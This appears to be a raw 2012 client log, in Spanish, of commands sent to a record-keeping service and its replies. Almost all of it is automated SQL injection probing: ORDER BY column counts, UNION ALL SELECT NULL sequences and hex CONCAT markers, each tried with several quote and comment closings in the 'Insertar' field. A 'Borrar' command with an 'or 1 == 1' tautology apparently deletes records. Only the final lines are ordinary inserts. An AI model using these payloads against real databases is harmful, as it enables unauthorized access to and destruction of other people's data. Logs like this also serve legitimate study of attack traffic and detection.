+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,-3652) UNION ALL SELECT NULL, NULL, NULL, CONCAT(0x3a6d6c733a,0x6e566c7249766b45496b,0x3a696a673a), NULL, NULL#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  463124
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,-5548) UNION ALL SELECT NULL, NULL, CONCAT(0x3a6d6c733a,0x534642656b69446b4673,0x3a696a673a), NULL, NULL, NULL#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  464433
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,-5626) UNION ALL SELECT NULL, CONCAT(0x3a6d6c733a,0x6855444c6d654c426e67,0x3a696a673a), NULL, NULL, NULL, NULL#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  839087
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 ORDER BY 1#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  240469
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 ORDER BY 5697#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  159476
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 UNION ALL SELECT NULL#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  567460
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 UNION ALL SELECT NULL, NULL#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  485664
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 UNION ALL SELECT NULL, NULL, NULL#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  564065
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 UNION ALL SELECT NULL, NULL, NULL, NULL#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  874888
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  680370
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  681212
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  597099
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  266401
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  432566
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  318671
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') ORDER BY 1#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  953788
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') ORDER BY 4987#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  514280
+2012-05-02 19:34:30 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') UNION ALL SELECT NULL#
+2012-05-02 19:34:30 -0500 respuesta recibida: Tu id del registro es  473565
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') UNION ALL SELECT NULL, NULL#
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  201044
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') UNION ALL SELECT NULL, NULL, NULL#
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  313277
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') UNION ALL SELECT NULL, NULL, NULL, NULL#
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  131024
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL#
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  557978
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL#
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  598057
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL#
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  735306
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  856968
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  521018
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  752113
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' ORDER BY 1#
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  890006
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' ORDER BY 9879#
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  811694
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' UNION ALL SELECT NULL#
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  917132
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' UNION ALL SELECT NULL, NULL#
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  818982
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' UNION ALL SELECT NULL, NULL, NULL#
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  9174
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' UNION ALL SELECT NULL, NULL, NULL, NULL#
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  487408
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL#
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  556782
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL#
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  799132
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL#
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  908971
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  17224
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  820019
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  860479
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) ORDER BY 1-- 
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  312298
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) ORDER BY 9439-- 
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  400467
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) UNION ALL SELECT NULL-- 
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  37692
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) UNION ALL SELECT NULL, NULL-- 
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  558285
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) UNION ALL SELECT NULL, NULL, NULL-- 
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  827454
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) UNION ALL SELECT NULL, NULL, NULL, NULL-- 
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  447543
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL-- 
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  583503
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- 
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  519552
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL-- 
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  444042
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- 
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  666318
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- 
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  900061
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- 
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  506632
+2012-05-02 19:34:31 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 ORDER BY 1-- 
+2012-05-02 19:34:31 -0500 respuesta recibida: Tu id del registro es  828076
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 ORDER BY 9752-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  982498
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 UNION ALL SELECT NULL-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  441921
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 UNION ALL SELECT NULL, NULL-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  517267
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 UNION ALL SELECT NULL, NULL, NULL-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  748842
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 UNION ALL SELECT NULL, NULL, NULL, NULL-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  170016
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  648841
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  848505
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  395532
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  571063
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  746933
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  687606
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') ORDER BY 1-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  993454
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') ORDER BY 2303-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  388041
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') UNION ALL SELECT NULL-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  678667
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') UNION ALL SELECT NULL, NULL-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  791242
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') UNION ALL SELECT NULL, NULL, NULL-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  336899
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') UNION ALL SELECT NULL, NULL, NULL, NULL-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  258217
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  927017
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  44959
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  367944
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  221068
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  355730
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  38664
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' ORDER BY 1-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  71485
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' ORDER BY 2120-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  276393
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' UNION ALL SELECT NULL-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  622976
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' UNION ALL SELECT NULL, NULL-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  755319
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' UNION ALL SELECT NULL, NULL, NULL-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  408972
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' UNION ALL SELECT NULL, NULL, NULL, NULL-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  492515
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  756542
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  463561
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  286671
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  49011
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  57904
+2012-05-02 19:34:32 -0500 mensaje enviado: Insertar,A01163951,Ingles,1,10' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- 
+2012-05-02 19:34:32 -0500 respuesta recibida: Tu id del registro es  231303
+2012-05-02 19:36:56 -0500 mensaje enviado: Borrar,964147 or 1 == 1
+2012-05-02 19:36:56 -0500 respuesta recibida: Tu registro ha sido borrado
+2012-05-02 19:38:15 -0500 mensaje enviado: Insertar,1163951,Chino,2,11
+2012-05-02 19:38:15 -0500 respuesta recibida: Tu id del registro es  693396
+2012-05-02 19:38:27 -0500 mensaje enviado: Insertar,1163951,,,
+2012-05-02 19:38:27 -0500 respuesta recibida: Tu id del registro es  61405
